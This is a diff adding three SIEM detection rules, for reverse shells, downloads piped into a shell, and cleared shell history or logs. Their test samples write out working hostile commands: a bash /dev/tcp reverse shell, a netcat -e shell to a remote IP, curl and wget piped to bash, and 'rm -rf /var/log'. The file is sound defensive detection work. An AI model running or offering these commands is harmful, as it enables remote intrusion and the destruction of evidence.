@@ -1,0 +1,94 @@
+title: Reverse Shell Command
+id: 070ee477-7651-471f-b18f-a2624103cf51
+status: test
+description: A command connected an interactive shell to a remote host, giving an attacker hands-on access.
+author: siemagent contributors
+tags:
+  - attack.execution
+  - attack.t1059.004
+logsource:
+  product: linux
+detection:
+  selection_bash:
+    message|contains|all:
+      - 'bash -i'
+      - '/dev/tcp/'
+  selection_netcat:
+    message|re: '\b(nc|ncat|netcat)\b.*\s-(e|c)\s'
+  selection_other:
+    message|contains:
+      - 'socat exec:'
+      - 'pty.spawn("/bin/'
+      - "pty.spawn('/bin/"
+  condition: 1 of selection_*
+falsepositives:
+  - Penetration tests
+level: critical
+remediation: Isolate the host, kill the process and its network connection, and investigate the initial access path.
+samples:
+  match:
+    - 'Oct 11 22:20:01 web01 bash[999]: bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'
+    - 'Oct 11 22:20:01 web01 bash[999]: nc -e /bin/sh 203.0.113.7 4444'
+    - 'Oct 11 22:20:01 web01 python3[1]: python3 -c ''import pty; pty.spawn("/bin/bash")'''
+  no_match:
+    - 'Oct 11 22:20:01 web01 bash[999]: nc -zv db01 5432'
+---
+title: Download Piped Into a Shell
+id: e7b7df78-a5d8-47d2-9337-73586ff6fedb
+status: test
+description: A remote script was downloaded and executed in one step, a common way to install malware or miners.
+author: siemagent contributors
+tags:
+  - attack.command_and_control
+  - attack.t1105
+logsource:
+  product: linux
+detection:
+  selection_download:
+    message|contains:
+      - 'curl '
+      - 'wget '
+  selection_pipe:
+    message|re: '\|\s*(sudo\s+)?(ba|z|da)?sh\b'
+  condition: selection_download and selection_pipe
+falsepositives:
+  - Documented installers run by administrators
+level: high
+remediation: Fetch and review the script URL, check for new processes, cron entries and outbound connections.
+samples:
+  match:
+    - 'Oct 11 22:21:00 web01 cron[1]: (www-data) CMD (curl -s http://198.51.100.23/x.sh | bash)'
+    - 'Oct 11 22:21:00 web01 bash[1]: wget -qO- http://198.51.100.23/i | sudo sh'
+  no_match:
+    - 'Oct 11 22:21:00 web01 bash[1]: curl -s https://api.example.com/health'
+---
+title: Shell History or System Logs Cleared
+id: 5ee6b40f-f6c1-4f47-958a-ff7eb41adb46
+status: test
+description: Shell history or system logs were deleted, which attackers do to hide their tracks.
+author: siemagent contributors
+tags:
+  - attack.defense_evasion
+  - attack.t1070
+logsource:
+  product: linux
+detection:
+  selection:
+    message|contains:
+      - 'history -c'
+      - 'rm -rf /var/log'
+      - 'rm /var/log/'
+      - 'truncate -s 0 /var/log'
+      - '> ~/.bash_history'
+      - 'unset HISTFILE'
+      - 'wevtutil cl'
+  condition: selection
+falsepositives:
+  - Log rotation scripts (these normally use logrotate, not rm)
+level: high
+remediation: Preserve remaining evidence, check central log copies for the missing period, and investigate the account.
+samples:
+  match:
+    - '<34>1 2026-10-03T10:50:00Z app01 bash 1 - root: history -c && rm -rf /var/log/auth.log'
+  no_match:
+    - '<34>1 2026-10-03T10:50:00Z app01 logrotate 1 - rotating /var/log/syslog'
